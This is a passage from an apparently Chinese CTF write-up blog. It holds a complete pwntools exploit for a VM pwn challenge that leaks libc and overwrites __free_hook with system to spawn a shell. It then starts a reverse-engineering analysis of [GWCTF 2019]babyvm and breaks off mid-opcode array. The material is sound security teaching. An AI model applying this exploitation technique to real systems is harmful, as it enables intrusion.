class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.binary = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#elf = ELF(&#x27;pwn&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#reg[v4] = reg[v2] + reg[v3]</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">v4, v3, v2</span>):</span><br><span class="line">    <span class="keyword">return</span> u32((p8(<span class="number">0x70</span>)+p8(v4)+p8(v3)+p8(v2))[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#reg[v4] = reg[v3] &lt;&lt; reg[v2]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">left_shift</span>(<span class="params">v4, v3, v2</span>):</span><br><span class="line">    <span class="keyword">return</span> u32((p8(<span class="number">0xc0</span>)+p8(v4)+p8(v3)+p8(v2))[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#reg[v4] = memory[reg[v2]]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">v4, v2</span>):</span><br><span class="line">    <span class="keyword">return</span> u32((p8(<span class="number">0x30</span>)+p8(v4)+p8(<span class="number">0</span>)+p8(v2))[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#memory[reg[v2]] = reg[v4]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">v4, v2</span>):</span><br><span class="line">    <span class="keyword">return</span> u32((p8(<span class="number">0x40</span>)+p8(v4)+p8(<span class="number">0</span>)+p8(v2))[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># reg[v4] = (unsigned __int8)v2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setnum</span>(<span class="params">v4, v2</span>):</span><br><span class="line">    <span class="keyword">return</span> u32((p8(<span class="number">0x10</span>)+p8(v4)+p8(<span class="number">0</span>)+p8(v2))[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">code = [</span><br><span class="line">    setnum(<span class="number">0</span>, <span class="number">8</span>),  <span class="comment"># reg[0]=8</span></span><br><span class="line">    setnum(<span class="number">1</span>, <span class="number">0xff</span>),  <span class="comment"># reg[1]=0xff</span></span><br><span class="line">    setnum(<span class="number">2</span>, <span class="number">0xff</span>),  <span class="comment"># reg[2]=0xff</span></span><br><span class="line">    left_shift(<span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>),  <span class="comment"># reg[2]=reg[2]&lt;&lt;reg[0](reg[2]=0xff&lt;&lt;8=0xff00)</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>),  <span class="comment"># reg[2]=reg[2]+reg[1](reg[2]=0xff00+0xff=0xffff)</span></span><br><span class="line">    left_shift(<span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>),  <span class="comment"># reg[2]=reg[2]&lt;&lt;reg[0](reg[2]=0xffff&lt;&lt;8=0xffff00)</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>),  <span class="comment"># reg[2]=reg[2]+reg[1](reg[2]=0xffff00+0xff=0xffffff)</span></span><br><span class="line">    setnum(<span class="number">1</span>, <span class="number">0xc8</span>),  <span class="comment"># reg[1]=0xc8</span></span><br><span class="line">    <span class="comment"># reg[2]=reg[2]&lt;&lt;reg[0](reg[2]=0xffffff&lt;&lt;8=0xffffff00)</span></span><br><span class="line">    left_shift(<span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="comment"># reg[2]=reg[2]+reg[1](reg[2]=0xffffff00+0xc8=0xffffffc8=-56)</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>),</span><br><span class="line">    read(<span class="number">3</span>, <span class="number">2</span>),  <span class="comment"># reg[3]=memory[reg[2]]=memory[-56]</span></span><br><span class="line">    setnum(<span class="number">1</span>, <span class="number">1</span>),  <span class="comment"># reg[1]=1</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>),  <span class="comment"># reg[2]=reg[2]+reg[1]=-56+1=-55</span></span><br><span class="line">    read(<span class="number">4</span>, <span class="number">2</span>),  <span class="comment"># reg[4]=memory[reg[2]]=memory[-55]</span></span><br><span class="line">    setnum(<span class="number">1</span>, <span class="number">0x16</span>),  <span class="comment"># reg[1]=0x10</span></span><br><span class="line">    left_shift(<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>),  <span class="comment"># reg[1]=reg[1]&lt;&lt;8=0x10&lt;&lt;8=0x1000</span></span><br><span class="line">    setnum(<span class="number">0</span>, <span class="number">0xb0</span>),  <span class="comment"># reg[0]=0x90</span></span><br><span class="line">    <span class="comment"># reg[1]=reg[1]+reh[0]=0x1000+0x90=0x1090 &amp;free_hook-8-&amp;stdin=0x1090</span></span><br><span class="line">    add(<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>),</span><br><span class="line">    add(<span class="number">3</span>, <span class="number">3</span>, <span class="number">1</span>),  <span class="comment"># reg[3]=reg[3]+reg[1]</span></span><br><span class="line">    setnum(<span class="number">1</span>, <span class="number">47</span>),  <span class="comment"># reg[1]=47</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>),  <span class="comment"># reg[2]=reg[2]+2=-55+47=-8</span></span><br><span class="line">    write(<span class="number">3</span>, <span class="number">2</span>),  <span class="comment"># memory[reg[2]]=memory[-8]=reg[3]</span></span><br><span class="line">    setnum(<span class="number">1</span>, <span class="number">1</span>),  <span class="comment"># reg[1]=1</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>),  <span class="comment"># reg[2]=reg[2]+1=-8+1=-7</span></span><br><span class="line">    write(<span class="number">4</span>, <span class="number">2</span>),  <span class="comment"># memory[reg[2]]=memory[-7]=reg[4]</span></span><br><span class="line">    u32((p8(<span class="number">0xff</span>)+p8(<span class="number">0</span>)+p8(<span class="number">0</span>)+p8(<span class="number">0</span>))[::-<span class="number">1</span>])  <span class="comment"># exit</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;PC: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;SP: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;SIZE: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(code)))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;CODE: &#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> code:</span><br><span class="line">    <span class="comment">#sleep(0.2)</span></span><br><span class="line">    io.sendline(<span class="built_in">str</span>(i))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;R3: &#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">last_4bytes = <span class="built_in">int</span>(io.recv(<span class="number">8</span>), <span class="number">16</span>)+<span class="number">8</span></span><br><span class="line">log.success(<span class="string">&#x27;last_4bytes =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(last_4bytes)))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;R4: &#x27;</span>)</span><br><span class="line">first_4bytes = <span class="built_in">int</span>(io.recv(<span class="number">4</span>), <span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&#x27;first_4bytes =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(first_4bytes)))</span><br><span class="line"></span><br><span class="line">free_hook = (first_4bytes &lt;&lt; <span class="number">32</span>)+last_4bytes</span><br><span class="line">libc_base = free_hook-libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system_addr = libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;free_hook =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(free_hook)))</span><br><span class="line">log.success(<span class="string">&#x27;system_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(system_addr)))</span><br><span class="line"><span class="comment">#io.recvuntil(&#x27;OVM?n&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(system_addr))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>由于程序只有一次写入和free的机会,并且写入和free用的是同一个指针</p><p>因此部署binsh和覆写system要在一次完成</p><p>故选择comment写为__free_hook-8,这样先写binsh,再写system,之后又触发free(comment)实际上就已经变成了system(‘/bin/sh’)</p><h2 id="GWCTF-2019-babyvm"><a href="#GWCTF-2019-babyvm" class="headerlink" title="[GWCTF 2019]babyvm"></a>[GWCTF 2019]babyvm</h2><p>一道逆向VM题,头大</p><p>初始化操作,前四个模拟寄存器,unk_202060存存储指令码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">nsigned __int64 __fastcall <span class="title function_">initt</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  *(_DWORD *)a1 = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">4</span>) = <span class="number">18</span>;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">8</span>) = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">12</span>) = <span class="number">0</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">16</span>) = &amp;unk_202060;</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">24</span>) = <span class="number">0xF1</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">32</span>) = sub_B5F;</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">40</span>) = <span class="number">0xF2</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">48</span>) = sub_A64;</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">56</span>) = <span class="number">0xF5</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">64</span>) = sub_AC5;</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">72</span>) = <span class="number">0xF4</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">80</span>) = sub_956;</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">88</span>) = <span class="number">0xF7</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">96</span>) = sub_A08;</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">104</span>) = <span class="number">0xF8</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">112</span>) = sub_8F0;</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">120</span>) = <span class="number">0xF6</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">128</span>) = sub_99C;</span><br><span class="line">  qword_2022A8 = <span class="built_in">malloc</span>(<span class="number">0x512</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(qword_2022A8, <span class="number">0</span>, <span class="number">0x512</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>F1,F2等操作码各自对应着函数</p><div class="table-container"><table><thead><tr><th>0xF1</th><th>实现mov操作</th></tr></thead><tbody><tr><td>0xF2</td><td>寄存器1异或寄存器2</td></tr><tr><td>0xF5</td><td>读入并判断长度</td></tr><tr><td>0xF4</td><td>nop</td></tr><tr><td>0xF7</td><td>寄存器1乘寄存器4</td></tr><tr><td>0xF8</td><td>寄存器1交换寄存器2</td></tr><tr><td>0xF6</td><td>寄存器1=2<em>寄存器2+3\</em>寄存器3+寄存器1</td></tr></tbody></table></div><p>提取出0x202060处的指令后脚本处理一下</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">opcode=[<span class="number">0xF5</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, </span><br><span class="line">  <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x21</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x02</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x23</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x24</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x25</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE1</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x26</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE4</span>, <span class="number">0x27</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x28</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, </span><br><span class="line">  <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x29</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, </span><br><span class="line">  <span class="number">0x2A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0C</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2D</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE1</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x30</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE4</span>, <span class="number">0x31</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, </span><br><span class="line">  <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x33</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF4</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF5</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE1</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x02</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE4</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, </span><br><span class="line">  <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x05</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE2</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE3</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE5</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF6</span>, <span class="number">0xF7</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE4</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE3</span>, <span class="number">0x09</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE5</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF6</span>, </span><br><span class="line">  <span class="number">0xF7</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x08</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE3</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE5</span>, <span 